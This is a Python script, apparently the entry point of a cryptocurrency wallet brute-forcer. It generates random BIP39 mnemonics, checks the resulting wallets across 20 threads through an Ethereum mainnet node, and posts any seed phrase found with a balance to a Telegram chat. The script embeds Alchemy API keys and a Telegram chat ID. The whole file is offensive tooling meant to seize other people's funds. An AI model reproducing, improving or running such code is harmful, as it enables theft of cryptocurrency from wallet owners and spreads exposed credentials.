import signal
from mnemonic import Mnemonic
from web3.auto import Web3
import requests
import time
import traceback
import threading
import queue
from brute import walletbrute
from fileio import safefilewriter
import json

# Fill your telegram token here or set to None if you don't want this function
TELE_BOT_TOKEN = None
# Channel ID or user id, use @getidbot to have it
TELE_CHAT_ID = "5624258194"
# How many thread
MAX_THREAD = 20
# Support coin path
SUPPORT_COIN = None

# No edit
wq = queue.Queue()


def gen():
	mnemo = Mnemonic("english")
	return mnemo.generate(strength=128)

def init_telegram():
	global TELE_BOT_TOKEN
	try:
		if TELE_BOT_TOKEN == "" or TELE_BOT_TOKEN is None:
			with open("telegramtoken.txt") as f:
				TELE_BOT_TOKEN = f.read()
		url=f"https://api.telegram.org/bot{TELE_BOT_TOKEN}/sendMessage"
		requests.get(url, params = {"chat_id": TELE_CHAT_ID,"text": "Telegram connect successfully"})
	except Exception as e:
		print(e)

def sendToTelegram(w, coin, bl):
	wq.put(f"{w} | {coin} | {bl}")
	if TELE_BOT_TOKEN is not None and TELE_BOT_TOKEN != "":
		data= f"I found it : {w} | {coin} | {bl}"
		url=f"https://api.telegram.org/bot{TELE_BOT_TOKEN}/sendMessage"
		requests.get(url, params = {"chat_id": TELE_CHAT_ID,"text":data})


def load_config():
	global MAX_THREAD, TELE_BOT_TOKEN, TELE_CHAT_ID, SUPPORT_COIN
	with open("config.json") as f:
		config = json.loads(f.read())
		MAX_THREAD = int(config["MAX_THREAD"])
		TELE_BOT_TOKEN = config["TELE_TOKEN"]
		TELE_CHAT_ID = config["TELE_CHAN_ID"]
		SUPPORT_COIN = config["SUPPORT_COIN"]


if __name__ == '__main__':
	# https://eth-mainnet.g.alchemy.com/v2/OatS-qWUFcNjgKNFTrq1m14A9h51mX2N
	w3 = Web3(Web3.HTTPProvider("https://eth-mainnet.g.alchemy.com/v2/cVoH6Tl8hMagXnCBYRb3cl7wxj7TXbCu"))
	load_config()
	init_telegram()
	fthread = safefilewriter(wq)
	fthread.start()
	brute_thread = {}
	for i in range(0, MAX_THREAD):
		brute_thread[i] = walletbrute(sendToTelegram, w3, gen, SUPPORT_COIN)
		brute_thread[i].start()
	try:
		# Wait for the termination signal (Ctrl+C)
		signal.signal(signal.SIGINT, signal.SIG_DFL)
	except KeyboardInterrupt:
		print("Stopped")
		
